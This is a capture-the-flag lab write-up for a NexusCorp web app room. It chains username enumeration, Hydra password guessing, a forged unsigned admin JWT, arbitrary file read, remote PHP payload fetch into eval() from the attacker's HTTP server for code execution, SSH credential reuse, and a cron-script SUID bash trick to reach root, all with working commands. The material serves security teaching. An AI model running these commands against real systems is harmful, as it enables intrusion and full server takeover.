
## Objective

Compromise the NexusCorp web application, obtain administrative access, gain remote code execution on the underlying server, pivot to a local user and ultimately escalate privileges to `root`.

This write-up deliberately does not disclose the room flags.

The objective is to document the exploitation methodology so the same techniques can be reused in other labs and penetration-testing engagements.


# Attack Chain

```
Web reconnaissance
        ↓
Employee / username enumeration
        ↓
Weak web credentials
        ↓
Authenticated user
        ↓
IDOR / BOLA
        ↓
JWT analysis
        ↓
Broken JWT signature verification
        ↓
Web administrator
        ↓
Arbitrary file read
        ↓
Application secrets disclosure
        ↓
Remote file fetch + eval()
        ↓
RCE as www-data
        ↓
Credential reuse
        ↓
SSH as devops
        ↓
Writable root-executed script
        ↓
SUID shell
        ↓
root
```

---

# 1. Initial Reconnaissance

Target:

```
10.129.155.130
```

The initial objective is not to immediately exploit the host. We first determine the exposed attack surface.

A port scan showed two relevant services:

```
22/tcp  SSH
80/tcp  HTTP
```

The web server was Apache running on Ubuntu.

Only two exposed services significantly reduce the initial search space:

- port 80 becomes the primary initial attack surface;
    
- port 22 may later become useful if credentials are discovered.
    

> Reusable methodology: always correlate services. Credentials recovered from the web application may later be reusable against SSH.

---

# 2. Web Application Reconnaissance

Browsing the application revealed a NexusCorp authentication portal.

The login form used:

```
POST /index.php

username=
password=
```

The username placeholder suggested the format:

```
firstname.lastname
```

Two publicly accessible pages were particularly interesting:

```
/team.php
/forgot.php
```

Rather than immediately brute-forcing the login form, the first objective was to collect valid usernames.

---

# 3. Employee Enumeration

The page:

```
/team.php
```

listed NexusCorp employees, including names such as:

```
Laura Hayes
Michael Chen
Sarah Johnson
Robert Wilson
Emma Taylor
David Brown
James Wright
```

Because the authentication form indicated the format:

```
firstname.lastname
```

we could derive candidate usernames such as:

```
laura.hayes
robert.wilson
sarah.johnson
...
```

## Why this matters

Employee information alone is not a compromise.

However, combining:

```
employee names
+
known username convention
```

produces a reliable username list suitable for:

- password spraying;
    
- password-reset enumeration;
    
- authentication testing.
    

This is a common OSINT-to-authentication transition.

---

# 4. Username Enumeration Through Password Reset

The password recovery endpoint was:

```
/forgot.php
```

We compared responses for known and invented usernames.

For an existing account such as:

```
laura.hayes
```

the application returned a password-reset confirmation.

For an invalid username, it returned:

```
No account found with that username.
```

This difference confirms a username enumeration vulnerability.

## Security issue

The recovery mechanism leaks whether an account exists.

A safer application would return the same generic response in both cases, for example:

```
If the account exists, password-reset instructions have been sent.
```

## Reusable lesson

When testing authentication systems, compare:

```
valid username + invalid password
invalid username + invalid password
password-reset responses
account-registration responses
```

Differences in text, status code, response length or timing can expose account validity.

---

# 5. Content Discovery

Directory enumeration exposed several interesting locations:

```
/admin/
/api/
/backup/
/support/
/static/

/auth.php
/config.php
/dashboard.php
```

The exact historical enumeration command was not preserved in the notes, but an equivalent reproducible command would be:

```
gobuster dir \
-u http://10.129.155.130/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt
```

The particularly interesting discovery was:

```
/backup/
```

Directory listing was enabled and revealed:

```
README.txt
config.enc
```

---

# 6. Recovering the Backup Encryption Key

The backup README explained that:

```
config.enc
```

was encrypted with:

```
AES-128-ECB
```

and that the decryption key could be found in:

```
/static/app.js
```

Inspecting the JavaScript revealed:

```
const CONFIG = {
    apiBase:'/api',

    // Encryption key for backup config decryption - AES-ECB-128
    // Key: N3xusK3y2024!!  (pad to 16 bytes with \0)

    _backupKey:'N3xusK3y2024!!'
};
```

This is a sensitive secret embedded in client-accessible JavaScript.

---

# 7. Understanding the AES Key

AES-128 requires a 128-bit key:

```
128 bits = 16 bytes
```

The discovered string was shorter than 16 bytes and the developer comment explicitly specified padding with NULL bytes.

The final raw key was therefore:

```
N3xusK3y2024!!\x00\x00
```

OpenSSL's `-K` option expects hexadecimal bytes.

The key becomes:

```
4e337875734b33793230323421210000
```

The backup could then be decrypted with:

```
openssl enc \
-d \
-aes-128-ecb \
-K 4e337875734b33793230323421210000 \
-in config.enc
```

The decrypted JSON disclosed information including:

```
{
  "deploy_env": "production",
  "system_user": "devops"
}
```

The important piece for later exploitation was:

```
system_user = devops
```

At this stage this does not give access to the operating system.

It only tells us that `devops` is likely a relevant local account.

---

# 8. Testing Weak Credentials

With confirmed usernames available, we tested authentication.

One approach used Hydra:

```
hydra \
-l robert.wilson \
-P /usr/share/wordlists/rockyou.txt \
10.129.155.130 \
http-post-form \
"/index.php:username=^USER^&password=^PASS^:F=Invalid credentials" \
-f -V
```

This identified a weak password for Robert.

The exact password is omitted from this public write-up.

```
robert.wilson:<REDACTED>
```

We later observed that the same weak password was accepted for multiple employees.

This demonstrates:

```
weak password policy
+
password reuse
```

---

# 9. Hydra False Positive — Important Methodology Lesson

Hydra later appeared to identify an empty password for another user.

Rather than trusting the tool, we manually verified the result:

```
curl -i \
-c laura_cookies.txt \
-d 'username=laura.hayes&password=' \
http://10.129.155.130/index.php
```

The response showed that authentication had not succeeded.

## Why Hydra was wrong

Our failure condition was:

```
F=Invalid credentials
```

Hydra interprets:

```
failure string absent
```

as:

```
successful authentication
```

The response for the empty password did not contain the exact failure string, which caused a false positive.

A stronger success condition would have been:

```
S=Location\: /dashboard.php
```

because successful authentication generated a redirect to the dashboard.

## Reusable lesson

Never consider automated authentication results authoritative.

Always validate interesting credentials manually.

With tools such as Hydra:

```
bad matcher
→ bad result
```

---

# 10. Establishing an Authenticated Session

After validating Robert's credentials, we authenticated manually:

```
curl -i \
-c cookies.txt \
-d 'username=robert.wilson&password=<REDACTED>' \
http://10.129.155.130/index.php
```

Successful authentication returned:

```
HTTP/1.1 302 Found
Location: /dashboard.php
```

and created a cookie named:

```
nexus_session
```

The cookie followed approximately this format:

```
BASE64(JSON).SIGNATURE
```

Decoding its payload showed:

```
{
  "user_id": 4,
  "username": "robert.wilson",
  "role": "user"
}
```

---

# 11. Testing Session-Cookie Tampering

A natural hypothesis was:

> If the role is stored client-side, can we change `"user"` to `"admin"`?

We modified the payload but reused the original signature.

The application rejected the session.

This proved that simple unsigned cookie manipulation was not sufficient.

Later source-code review confirmed two reasons:

1. the HMAC signature was validated;
    
2. the application's role was retrieved again from the database.
    

## Reusable lesson

Client-side data is not automatically exploitable merely because it contains privileges.

Always determine:

```
Is integrity checked?
Is authorization based on this value?
Is the value reloaded server-side?
```

---

# 12. API Discovery

The authenticated dashboard referenced several API endpoints:

```
/api/auth/token.php
/api/users/profile.php?id=
/api/files.php?name=
```

The JWT endpoint could be queried with Robert's authenticated cookie:

```
curl -s \
-b cookies.txt \
http://10.129.155.130/api/auth/token.php
```

For convenience:

```
TOKEN=$(
    curl -s \
    -b cookies.txt \
    http://10.129.155.130/api/auth/token.php |
    python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])'
)
```

We could then inspect the token:

```
echo "$TOKEN"
```

Its payload contained approximately:

```
{
  "sub": "robert.wilson",
  "role": "user",
  "iat": ...,
  "exp": ...
}
```

---

# 13. IDOR / BOLA

Robert's profile was accessible through:

```
/api/users/profile.php?id=4
```

The parameter:

```
id=4
```

immediately suggested an object identifier.

A minimal authorization test was therefore to request another ID.

Example:

```
curl \
-b cookies.txt \
http://10.129.155.130/api/users/profile.php?id=1
```

The response returned another employee's data, including the administrator profile.

This proves an authorization flaw.

## Why this is IDOR / BOLA

Robert is legitimately authenticated.

The issue is not authentication.

The issue is:

```
Robert requests object belonging to another user
↓
server returns it
```

The application checks:

```
Are you logged in?
```

but fails to check:

```
Are you allowed to access this specific object?
```

This is an IDOR/BOLA vulnerability.

The first room flag was recovered from the exposed administrator data:

```
THM{REDACTED}
```

---

# 14. Testing `/api/files.php`

We then tested the file endpoint using Robert's legitimate JWT:

```
curl \
-H "Authorization: Bearer $TOKEN" \
"http://10.129.155.130/api/files.php?name=test"
```

The response indicated that an administrator JWT was required.

This tells us the endpoint performs authorization based on information inside the JWT.

That immediately makes the token-validation implementation interesting.

---

# 15. JWT Secret Cracking Attempt

The JWT used:

```
HS256
```

A valid HS256 token requires knowledge of the shared secret.

We first checked whether the secret was weak enough to crack:

```
echo "$TOKEN" > jwt.txt
```

Then:

```
hashcat \
-m 16500 \
jwt.txt \
/usr/share/wordlists/rockyou.txt
```

Hashcat exhausted the wordlist without recovering the key.

Result:

```
Recovered: 0/1
```

We also tested whether the AES backup key was reused as the JWT secret.

It was not.

## Decision

At this point:

```
secret cracking
→ unsuccessful
```

so rather than spending more time brute-forcing, we tested whether the server actually validated JWT signatures correctly.

---

# 16. Forging an Administrator JWT

A JWT contains three Base64URL-encoded sections:

```
HEADER.PAYLOAD.SIGNATURE
```

Our objective was to change:

```
"role":"user"
```

to:

```
"role":"admin"
```

and determine whether the server would validate the signature.

We created a token with an administrator payload and no valid signature.

One reproducible method is:

```
NONE_TOKEN=$(python3 - <<'PY'
import base64
import json
import time

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).decode().rstrip("=")

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "sub": "robert.wilson",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

print(f"{b64url(header)}.{b64url(payload)}.")
PY
)
```

Test:

```
curl \
-H "Authorization: Bearer $NONE_TOKEN" \
"http://10.129.155.130/api/files.php?name=test"
```

The response changed.

Instead of:

```
Admin JWT required
```

the application began processing the requested file path.

That proves:

```
our forged admin role was accepted
```

---

# 17. Why This Was Not Merely `alg:none`

Initially it looked like a classic JWT `alg:none` issue.

Later, however, source-code disclosure revealed the actual vulnerability.

The application's verification function decoded the JWT payload but had its signature-verification code disabled.

Conceptually:

```
$payload = decode_token_payload();

// signature calculation existed
// signature comparison was disabled

return $payload;
```

Therefore the real finding is:

```
JWT signature verification disabled
```

not simply:

```
alg:none accepted
```

Any suitably structured unexpired token containing:

```
"role":"admin"
```

could therefore be trusted.

This distinction is important when writing a penetration-test report.

---

# 18. Administrator Access

We validated the privilege escalation directly:

```
curl -i \
-H "Authorization: Bearer $NONE_TOKEN" \
http://10.129.155.130/admin/
```

The response was:

```
HTTP/1.1 200 OK
```

and the administrator console was returned.

Interestingly, it still displayed:

```
Logged in as: robert.wilson
```

The identity remained Robert, but his JWT supplied administrator authorization.

The second room flag was displayed by the panel:

```
THM{REDACTED}
```

---

# 19. Arbitrary File Read

The administrator file API accepted a `name` parameter.

We tested an application file:

```
curl \
-H "Authorization: Bearer $NONE_TOKEN" \
--get \
--data-urlencode 'name=/var/www/html/config.php' \
http://10.129.155.130/api/files.php
```

The server returned the file contents.

This provided:

```
DB_HOST
DB_NAME
DB_USER
DB_PASS
JWT_SECRET
APP_SECRET
```

The actual secrets are omitted here.

The important observation was that the database password had a name strongly related to the previously discovered Linux account:

```
system_user = devops
DB_PASS = <value containing "D3v0ps">
```

At this point this is only an **interesting credential-reuse hypothesis**.

It is not yet evidence that the SSH password is the same.

---

# 20. Source-Code Review

Because the file API allowed access to files under:

```
/var/www/html/
```

we used it to inspect application source code rather than blindly fuzzing.

This was valuable because it converted several assumptions into confirmed implementation details.

## `auth.php`

Reading:

```
/var/www/html/auth.php
```

confirmed:

- the session cookie used HMAC-SHA256;
    
- the application reloaded roles from the database;
    
- JWTs were generated with HS256;
    
- JWT signature verification was commented out / disabled.
    

This explains all previous observations.

---

# 21. Is the File Endpoint LFI?

The local branch used:

```
file_get_contents($real);
```

The path was resolved with:

```
realpath()
```

and constrained to:

```
/var/www/html/
```

This is better described as:

```
Arbitrary File Read
```

or:

```
Local File Disclosure
```

rather than classic LFI.

Classic LFI typically involves PHP constructs such as:

```
include()
require()
```

which can execute included PHP files.

Here the local branch only reads them.

---

# 22. Remote File Handling

The same endpoint had a different branch for values beginning with:

```
http://
https://
```

Its logic was approximately:

```
$remote = file_get_contents($name);

eval(
    str_replace(
        "<?php",
        "",
        $remote
    )
);
```

This is critical.

The server:

```
1. downloads attacker-controlled remote content
2. passes it to eval()
```

Therefore attacker-controlled PHP code becomes server-side code execution.

This is functionally an RFI / remote-code-inclusion vulnerability leading directly to RCE.

---

# 23. Building a Minimal RCE Payload

Rather than immediately launching a reverse shell, we first validated execution with the smallest possible payload.

On the AttackBox:

```
cat > payload.txt <<'EOF'
echo "COMMAND OUTPUT:\n";
system("id");

echo "\nFLAG:\n";
echo file_get_contents("/opt/flag3.txt");
EOF
```

Notice that there is no:

```
<?php
```

opening tag.

This avoids complications because the vulnerable application itself feeds the downloaded contents into:

```
eval()
```

We then exposed the payload over HTTP:

```
python3 -m http.server 8000
```

---

# 24. Triggering the RFI

From the AttackBox:

```
curl -i \
-H "Authorization: Bearer $NONE_TOKEN" \
--get \
--data-urlencode 'name=http://10.129.89.227:8000/payload.txt' \
http://10.129.155.130/api/files.php
```

The response included:

```
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

This confirms:

```
Remote Code Execution
```

with the operating-system identity:

```
www-data
```

The third room flag could also be read from:

```
/opt/flag3.txt
```

and is omitted here:

```
THM{REDACTED}
```

---

# 25. Why Start With `id`?

When obtaining code execution, the first goal should not necessarily be a reverse shell.

A command such as:

```
id
```

immediately tells us:

```
which user executes our code?
which groups does it belong to?
what privilege level have we obtained?
```

Here:

```
www-data
```

showed that additional privilege escalation or lateral movement would still be required.

---

# 26. Credential Reuse Hypothesis

At this stage we had independently discovered:

```
system_user = devops
```

and:

```
DB_PASS = <REDACTED>
```

The database password itself contained a strong `devops` naming pattern.

SSH was also available on port 22.

The next minimal test was therefore:

```
ssh devops@10.129.155.130
```

using the database password.

Authentication succeeded.

Only **after this successful test** can we state that credential reuse existed.

## Vulnerability

```
Database credential
        ↓
reused as
        ↓
Linux account password
```

This allowed lateral movement from the application compromise to an interactive SSH account.

---

# 27. User-Level Access

Once connected:

```
whoami
id
pwd
ls -la
```

confirmed:

```
devops
```

The user's home directory contained the fourth room flag:

```
THM{REDACTED}
```

At this stage:

```
Web user     → compromised
Web admin    → compromised
www-data     → code execution
devops       → SSH shell
root         → still required
```

---

# 28. Linux Privilege-Escalation Enumeration

We now switched methodology from web exploitation to local Linux privilege escalation.

The first checks were:

```
whoami
id
groups
sudo -l
```

Result:

```
devops had no sudo permissions
```

So direct sudo abuse was eliminated.

---

# 29. SUID Enumeration

We searched for SUID binaries:

```
find / -perm -4000 -type f 2>/dev/null
```

Most results were standard binaries such as:

```
passwd
su
sudo
mount
umount
```

No unusual SUID application immediately stood out.

## Why check SUID?

A SUID-root executable runs with the effective privileges of its owner.

Custom or vulnerable SUID-root binaries can therefore provide privilege escalation.

Here, however, this avenue did not immediately produce a useful candidate.

---

# 30. Linux Capabilities

Next:

```
getcap -r / 2>/dev/null
```

Again, no immediately exploitable abnormal capability stood out.

Capabilities such as:

```
cap_setuid
cap_dac_override
cap_sys_admin
```

on unusual attacker-controllable binaries would have been particularly interesting.

---

# 31. Scheduled Tasks and Writable Files

We examined cron jobs:

```
find /etc/cron* \
-type f \
-maxdepth 2 \
-ls 2>/dev/null
```

and:

```
cat /etc/crontab
cat /etc/cron.d/* 2>/dev/null
```

Nothing directly referenced our target script.

We also inspected systemd timers:

```
systemctl list-timers --all
```

Again, nothing immediately explained an exploitable path.

---

# 32. Searching for Custom Root-Owned Files

Custom scripts deserve special attention because they often have weaker permissions than standard system files.

We inspected:

```
ls -la /opt
```

and:

```
find /opt \
-maxdepth 3 \
-type f \
-ls 2>/dev/null
```

Two files stood out:

```
/opt/admin_bot.py
/opt/monitoring/health_report.sh
```

The monitoring script had permissions equivalent to:

```
owner: root
group: devops
group write enabled
```

Conceptually:

```
-rwxrwxr-- root devops health_report.sh
```

Therefore:

```
devops can modify a file owned by root
```

This is suspicious, but not enough by itself for privilege escalation.

We still need something privileged to execute the file.

---

# 33. Searching for Root-Owned Writable Files

A useful privilege-escalation command was:

```
find / \
-xdev \
-type f \
-user root \
-writable \
2>/dev/null
```

This directly highlighted:

```
/opt/monitoring/health_report.sh
/opt/admin_bot.py
```

## Reusable lesson

The combination we seek is:

```
low-privileged user can modify file
+
privileged process executes file
```

A writable root-owned file alone is not necessarily exploitable.

---

# 34. Understanding `admin_bot.py`

Reading:

```
sed -n '1,260p' /opt/admin_bot.py
```

also explained an earlier web-testing mystery.

The admin bot did not use a browser.

Instead, it extracted HTTP URLs from support tickets using a regex:

```
url_pat = r"https?://[A-Za-z0-9./_?&=:%+-]+"
urls = re.findall(url_pat, msg)
```

and requested them using:

```
requests.get(url, cookies=COOKIE, timeout=5)
```

This explained why previous attempts at blind XSS appeared to generate HTTP callbacks but never executed JavaScript.

The bot was effectively:

```
URL extractor
+
HTTP client
```

not a browser.

## Important lesson

Callbacks alone do not prove XSS.

Always determine whether JavaScript actually executed.

---

# 35. Monitoring Processes With `pspy`

The machine already contained:

```
/opt/tools/pspy64
```

We launched:

```
/opt/tools/pspy64
```

`pspy` is useful during Linux privilege-escalation enumeration because it can observe processes and scheduled jobs without requiring root access.

Shortly afterward we observed:

```
UID=0 ... /usr/sbin/CRON
UID=0 ... /bin/sh -c /opt/monitoring/health_report.sh
UID=0 ... /bin/bash /opt/monitoring/health_report.sh
```

This provides the missing evidence.

We now know:

```
devops can modify health_report.sh
+
root executes health_report.sh
```

Therefore arbitrary commands appended to the script will eventually execute as root.

---

# 36. Root Privilege Escalation

Before modifying the script we created a backup:

```
cp \
/opt/monitoring/health_report.sh \
~/health_report.sh.bak
```

We then appended:

```
echo \
'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' \
>> /opt/monitoring/health_report.sh
```

The appended command performs two operations.

First:

```
cp /bin/bash /tmp/rootbash
```

Because the cron job executes it as root, the copy is created as a root-owned file.

Second:

```
chmod u+s /tmp/rootbash
```

sets the SUID bit.

---

# 37. Understanding SUID

Normally:

```
/bin/bash
```

runs with the privileges of the user who executes it.

A root-owned SUID executable instead receives:

```
effective UID = root
```

After the cron task executed our modified script:

```
ls -l /tmp/rootbash
```

showed approximately:

```
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

The important character is:

```
s
```

inside:

```
rws
```

It indicates the SUID bit.

---

# 38. Obtaining the Root Shell

Executing simply:

```
/tmp/rootbash
```

is not always enough because Bash contains protections against unintended privilege inheritance.

We therefore used:

```
/tmp/rootbash -p
```

The:

```
-p
```

option tells Bash to preserve its privileged effective identity.

Verification should always follow:

```
id
whoami
```

The important value is:

```
euid=0(root)
```

At this stage arbitrary root-level access has been achieved.

The final room flag was located in:

```
/root/root.txt
```

and is intentionally omitted:

```
THM{REDACTED}
```

---

# 39. Cleanup

Persistence or privilege-escalation artifacts should not be left behind.

The original monitoring script can be restored:

```
cp \
/home/devops/health_report.sh.bak \
/opt/monitoring/health_report.sh
```

Then remove the SUID Bash copy:

```
rm /tmp/rootbash
```

In a real engagement, cleanup should follow the agreed Rules of Engagement and all modifications should be documented.

---

# Key Techniques to Reuse

## Web Enumeration

Look for:

```
employee directories
username conventions
password-reset differences
backup directories
JavaScript configuration
API endpoints
```

Do not treat frontend JavaScript as harmless; developers often leak:

```
keys
internal URLs
API routes
debug configuration
```

---

## Authentication Testing

Separate:

```
username enumeration
password guessing
password spraying
credential reuse
```

Always validate automated-tool results manually.

For HTTP brute forcing, prefer strong success indicators such as:

```
302 redirect
session cookie
unique authenticated page content
```

rather than relying only on error-message absence.

---

## Authorization Testing

For any endpoint such as:

```
/profile?id=123
/document?id=123
/order?id=123
```

ask:

```
What happens if I request another user's object?
```

Authentication does not imply authorization.

---

## JWT Testing

When encountering a JWT:

```
1. Decode header and payload
2. Identify the algorithm
3. Check claims
4. Test weak-secret possibilities if appropriate
5. Verify that signature validation actually occurs
6. Test whether authorization trusts client-controlled claims
```

Do not conclude that a vulnerability is `alg:none` merely because a token using `alg:none` worked.

Determine the actual implementation flaw.

---

## File-Handling Endpoints

When an endpoint accepts:

```
file
path
name
url
template
page
```

test the semantic classes separately:

```
local file access
path traversal
remote URLs
file inclusion
source disclosure
execution
```

`file_get_contents()` is not the same as `include()`.

But:

```
file_get_contents(attacker URL)
+
eval()
```

is direct code execution.

---

## After RCE

Start with:

```
id
whoami
pwd
hostname
```

before attempting a reverse shell.

Determine:

```
execution user
groups
filesystem access
credentials
environment
```

RCE as `www-data` is not equivalent to root compromise.

---

## Credential Reuse

When credentials are found in:

```
configuration files
databases
deployment scripts
environment variables
backups
```

test them carefully against relevant services.

A discovered database password is not automatically an operating-system password.

Credential reuse is confirmed only after successful authentication elsewhere.

---

## Linux Privilege Escalation

A useful initial sequence is:

```
id
groups
sudo -l
```

then:

```
find / -perm -4000 -type f 2>/dev/null
```

then:

```
getcap -r / 2>/dev/null
```

then investigate:

```
cron
systemd timers
custom scripts
root-owned writable files
writable directories
local-only services
credentials
```

A particularly useful search is:

```
find / \
-xdev \
-type f \
-user root \
-writable \
2>/dev/null
```

---

## `pspy`

Use `pspy` when you suspect scheduled or privileged background execution but cannot see the configuration directly.

The critical pattern is:

```
Writable by low-privileged user
        +
Executed with UID 0
        =
Privilege escalation candidate
```

---

# Final Attack Path

```
Public web application
        ↓
Employee enumeration
        ↓
Username enumeration
        ↓
Weak reused web password
        ↓
Authenticated Robert session
        ↓
IDOR / BOLA
        ↓
Administrator information disclosure
        ↓
JWT endpoint
        ↓
JWT signature validation failure
        ↓
Forged administrator JWT
        ↓
Administrator console
        ↓
Arbitrary source-file read
        ↓
Application credentials
        ↓
Remote URL + eval()
        ↓
RCE as www-data
        ↓
Database credential reuse
        ↓
SSH as devops
        ↓
Linux enumeration
        ↓
Writable root-owned monitoring script
        ↓
pspy confirms root cron execution
        ↓
SUID Bash created by root
        ↓
/tmp/rootbash -p
        ↓
root
```

# Main Lessons

The most important lesson from Domino is that the compromise was not based on one isolated critical bug.

The complete takeover resulted from chaining weaknesses across several trust boundaries:

```
information disclosure
→ authentication weakness
→ broken object authorization
→ broken JWT verification
→ file disclosure
→ RCE
→ credential reuse
→ insecure Unix permissions
→ root scheduled execution
```

For penetration testing, the key skill is therefore not merely knowing individual exploits.

It is being able to repeatedly perform:

```
Observation
    ↓
Hypothesis
    ↓
Minimal test
    ↓
Interpretation
    ↓
Next hypothesis
```

That process is reusable far beyond this specific room.